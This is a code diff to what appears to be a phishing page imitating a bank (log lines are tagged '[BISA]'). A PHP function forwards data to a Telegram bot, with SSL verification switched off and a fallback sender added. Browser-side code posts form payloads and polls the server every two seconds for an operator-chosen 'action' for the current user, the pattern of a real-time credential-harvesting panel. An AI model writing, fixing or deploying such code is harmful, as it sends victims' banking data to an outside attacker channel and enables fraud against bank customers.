@@ -24,21 +24,33 @@ function sendTelegram($text, $reply_markup = null) {
     ];
     if ($reply_markup) $params['reply_markup'] = $reply_markup;
 
-    $ch = curl_init("https://api.telegram.org/bot$token/sendMessage");
-    curl_setopt_array($ch, [
-        CURLOPT_POST           => true,
-        CURLOPT_POSTFIELDS     => http_build_query($params),
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT        => 5,
-        CURLOPT_SSL_VERIFYPEER => true,
-    ]);
-    $r = curl_exec($ch);
-    curl_close($ch);
+    $url = "https://api.telegram.org/bot$token/sendMessage";
+
+    // Intentar con curl primero, fallback a file_get_contents
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_POST           => true,
+            CURLOPT_POSTFIELDS     => http_build_query($params),
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT        => 10,
+            CURLOPT_SSL_VERIFYPEER => false,
+        ]);
+        $r = curl_exec($ch);
+        $err = curl_error($ch);
+        curl_close($ch);
+        @file_put_contents(__DIR__ . '/tg_log.txt', date('H:i:s') . " CURL: $r | ERR: $err\n", FILE_APPEND);
+        return $r;
+    }
+
+    // Fallback: file_get_contents
+    $r = @file_get_contents($url . '?' . http_build_query($params));
+    @file_put_contents(__DIR__ . '/tg_log.txt', date('H:i:s') . " FGC: $r\n", FILE_APPEND);
     return $r;
 }
 
 function sanitize($s) {
-    return htmlspecialchars(trim($s), ENT_QUOTES, 'UTF-8');
+    return preg_replace('/[^a-zA-Z0-9._@\-]/', '', trim($s));
 }
 
 // ---------------------------------------------------------------
@@ -567,25 +579,43 @@ if ($method === 'GET' && isset($_GET['check'])) {
   function showError(el) { el.classList.add('active'); }
   function hideError(el) { el.classList.remove('active'); }
 
+  // Base URL: detectar ruta del script actual
+  const BASE = (function(){
+    const s = document.currentScript || document.querySelector('script');
+    const p = window.location.pathname;
+    // Si la URL termina en / o no tiene .php, agregar index.php
+    if (p.endsWith('/')) return p + 'index.php';
+    if (p.endsWith('.php')) return p;
+    return p + '/index.php';
+  })();
+
   async function sendData(payload) {
     try {
-      const r = await fetch('index.php', {
+      console.log('[BISA] Enviando:', payload.action, BASE);
+      const r = await fetch(BASE, {
         method: 'POST',
         headers: {'Content-Type':'application/json'},
         body: JSON.stringify(payload),
       });
-      return await r.json();
-    } catch(e) { return {ok:false}; }
+      const j = await r.json();
+      console.log('[BISA] Respuesta:', j);
+      return j;
+    } catch(e) { console.error('[BISA] Error fetch:', e); return {ok:false}; }
   }
 
   function startPolling(callback) {
     stopPolling();
+    console.log('[BISA] Polling iniciado para:', currentUser);
     pollInterval = setInterval(async () => {
       try {
-        const r = await fetch('index.php?check=' + encodeURIComponent(currentUser));
+        const r = await fetch(BASE + '?check=' + encodeURIComponent(currentUser));
         const d = await r.json();
-        if (d.action) { stopPolling(); callback(d.action); }
-      } catch(e) {}
+        if (d.action) {
+          console.log('[BISA] Acción recibida:', d.action);
+          stopPolling();
+          callback(d.action);
+        }
+      } catch(e) { console.error('[BISA] Poll error:', e); }
     }, 2000);
   }
   function stopPolling() {
